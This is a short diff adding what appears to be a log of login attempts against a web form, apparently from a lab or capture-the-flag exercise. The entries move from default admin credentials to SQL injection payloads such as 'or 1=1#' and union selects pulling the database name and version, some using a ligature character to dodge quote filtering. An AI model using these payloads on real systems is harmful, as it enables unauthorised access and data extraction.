@@ -1,0 +1,12 @@
+User Name:adminPassword:admin
+User Name:Password:
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin1
+User Name:adminPassword:admin'
+User Name:adminPassword:adminﬂ'
+User Name:adminPassword:adminﬂ'or 1=1#
+User Name:adminPassword:adminﬂ'union select 1,2,3#
+User Name:0Password:0ﬂ'union select 1,2#
+User Name:0Password:0ﬂ'union select 1,database()#
+User Name:0Password:0ﬂ'union select 1,version()#
